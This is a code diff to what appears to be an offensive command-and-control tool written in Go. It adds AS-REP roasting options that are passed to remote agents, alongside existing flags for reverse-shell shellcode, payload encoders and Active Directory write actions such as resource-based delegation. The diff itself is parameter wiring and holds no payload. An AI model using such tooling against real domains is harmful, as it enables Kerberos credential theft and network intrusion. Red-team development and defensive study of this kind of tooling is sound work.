@@ -167,6 +167,10 @@ func main() {
 	adSPN := flag.String("ad-spn", "", "SPN (add_spn / remove_spn)")
 	adPrimaryGID := flag.Uint("ad-primary-gid", 0, "primaryGroupID (set_primary_group)")
 	adEncodedSD := flag.String("ad-encoded-sd", "", "encoded security descriptor (set_rbcd)")
+	roastUser := flag.String("roast-user", "", "AS-REP roast: target username")
+	roastRealm := flag.String("roast-realm", "", "AS-REP roast: realm (e.g. CORP.LOCAL)")
+	roastDC := flag.String("roast-dc", "", "AS-REP roast: domain controller IP")
+	roastPort := flag.Int("roast-port", 88, "AS-REP roast: DC port")
 	scArch := flag.String("shellcode-arch", "linux_x64", "shellcode target: linux_x64|linux_x86|windows_x64|macos_x64")
 	scKind := flag.String("shellcode-kind", "exec_sh", "shellcode kind: exec_sh|reverse_sh|exec_cmd")
 	scEncode := flag.String("shellcode-encode", "none", "encoder: none|xor|rot13|null_free|chunked_xor|base64|uuid|ipv4")
@@ -593,7 +597,7 @@ func main() {
 	}
 
 	// adenum dispatch — AD enumeration OR write via the first agent
-	if *adEnum != "" || *adWrite != "" {
+	if *adEnum != "" || *adWrite != "" || *roastUser != "" {
 		go runAdEnumDispatch(mgr, adEnumArgs{
 			Action:      *adEnum,
 			Host:        *adHost,
@@ -613,6 +617,10 @@ func main() {
 			SPN:         *adSPN,
 			PrimaryGID:  uint32(*adPrimaryGID),
 			EncodedSD:   *adEncodedSD,
+			RoastUser:   *roastUser,
+			RoastRealm:  *roastRealm,
+			RoastDC:     *roastDC,
+			RoastPort:   *roastPort,
 		})
 	}
 
@@ -1631,6 +1639,10 @@ type adEnumArgs struct {
 	SPN         string
 	PrimaryGID  uint32
 	EncodedSD   string
+	RoastUser   string
+	RoastRealm  string
+	RoastDC     string
+	RoastPort   int
 }
 
 // runAdEnumDispatch waits for the first agent, fires an AdEnumStart.
@@ -1668,6 +1680,10 @@ func runAdEnumDispatch(mgr *session.Manager, a adEnumArgs) {
 		SPN:         a.SPN,
 		PrimaryGID:  a.PrimaryGID,
 		EncodedSD:   a.EncodedSD,
+		RoastUser:   a.RoastUser,
+		RoastRealm:  a.RoastRealm,
+		RoastDC:     a.RoastDC,
+		RoastPort:   a.RoastPort,
 	}
 	if err := s.SendAdEnumStart(sessionID, req); err != nil {
 		log.Printf("[adenum] start: %v", err)
